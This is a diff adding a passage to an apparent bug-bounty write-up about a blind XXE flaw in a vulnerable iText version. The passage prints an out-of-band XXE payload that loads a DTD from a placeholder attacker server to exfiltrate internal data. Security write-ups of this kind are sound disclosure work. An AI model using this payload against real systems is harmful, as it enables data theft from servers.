@@ -69,5 +69,17 @@ Alright, let's place it on line 742 then... Uploaded it... and ... wait for it..
 
 So yeah, it was in fact a vulnerable iText version to XXE, BUT, that version of Java made me tweak a little, it was a pretty updated one. Well, as always it was time to escalate the bug.
 
+Due to the nature of the feature, no direct feedback was available after every upload, therefore an error based XXE was not possible, so I had to go with the Blind route using Out-of-Band attacks to try to exfiltrate internal information.
+
+The XML parser didn't parse regular external entities so I had to try different variations of External Parameter entities. After some trial and error I came up with a working payload:
+
+```html
+<!DOCTYPE root [ <!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">
+%ext;
+%ent;
+]>
+<root>&data;</root>
+```
+
 
 
